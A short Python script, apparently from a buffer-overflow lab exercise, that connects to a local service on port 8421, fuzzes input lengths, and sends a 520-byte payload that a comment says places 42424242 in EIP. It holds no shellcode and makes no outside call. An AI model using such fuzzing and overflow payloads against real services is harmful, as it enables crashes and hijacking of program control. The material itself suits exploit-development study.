import socket as s
import time

sock = s.socket(s.AF_INET, s.SOCK_STREAM)

sock.connect(("127.0.0.1", 8421))
msg = sock.recv(2048)
print(msg.decode())

# for i in range(485, 540):
#     # Command is parsed into isASCII despite not being a valid command
#     payload = "A" * i + "CCC" + "BBBB"
#     print(f"Trying length {i + 7}")
#     time.sleep(0.1)
#     sock.send(payload.encode())
#     msg = sock.recv(2048)
#     print(msg.decode())
#     # Causes consistent crash @ length 513

i = 513
payload = "A" * i + "CCC" + "BBBB"
print(f"Trying length {i + 7}")
time.sleep(0.1)
sock.send(payload.encode())
msg = sock.recv(2048)
print(msg.decode())
# 42424242 in eip @ length 520
